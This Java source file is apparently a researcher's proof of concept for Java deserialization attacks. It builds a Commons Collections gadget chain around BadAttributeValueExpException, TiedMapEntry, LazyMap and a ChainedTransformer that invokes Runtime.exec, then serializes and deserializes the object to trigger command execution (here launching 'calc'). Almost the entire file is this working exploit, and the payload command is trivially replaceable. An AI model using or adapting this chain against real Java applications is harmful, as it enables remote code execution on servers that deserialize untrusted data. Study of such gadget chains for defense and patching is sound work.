package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import sun.misc.Unsafe;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

import static org.example.RflectionsAPI.getFieldNodeByReflect;
import static org.example.RflectionsAPI.getObjectNodeByUnsafe;

public class NewBadException {
    public static void main(String[] args) throws Exception {

        Transformer[] faketransformers = new Transformer[]{new ConstantTransformer(1)};
        //获取Unsafe
        Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafe.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafe.get(null);


        Transformer[] transformers = new Transformer[]{new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
        };
        Transformer transformerchain = new ChainedTransformer(faketransformers);

        Map innermap = new HashMap();
        Map lazymap = LazyMap.decorate(innermap,transformerchain);


        //组件其二
        Object badException = getObjectNodeByUnsafe(unsafe, "javax.management.BadAttributeValueExpException");

        //组件其五


        //组件其三
        Object tme = getObjectNodeByUnsafe(unsafe, "org.apache.commons.collections.keyvalue.TiedMapEntry");
        Object synchronizedMap = getObjectNodeByUnsafe(unsafe, "java.util.Collections$SynchronizedMap");
        //组件其四



        Field tmefield2 = getFieldNodeByReflect("org.apache.commons.collections.keyvalue.TiedMapEntry", "map");

        Field badfield = getFieldNodeByReflect("javax.management.BadAttributeValueExpException", "val");
        Field mapfield = getFieldNodeByReflect("java.util.Collections$SynchronizedMap", "m");
        Field mapfield2 = getFieldNodeByReflect("java.util.Collections$SynchronizedMap", "mutex");
        //process
        

//        tmefield2.set(tme, lazymap);
//        Hashtable hashtable1 = new Hashtable<>();
//        hashtable1.put("tme", tme);
//        AtomicReference atomicReference = new AtomicReference<>(hashtable1);
//        badfield.set(badException, atomicReference);

        tmefield2.set(tme, lazymap);
        Hashtable hashtable1 = new Hashtable<>();
        hashtable1.put("tme", tme);
        mapfield.set(synchronizedMap, hashtable1);
        mapfield2.set(synchronizedMap, synchronizedMap);
        badfield.set(badException, synchronizedMap);


        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerchain, transformers);

        //serial
        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(badException);
        oos.close();

        //unserial
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = ois.readObject();

    }


}
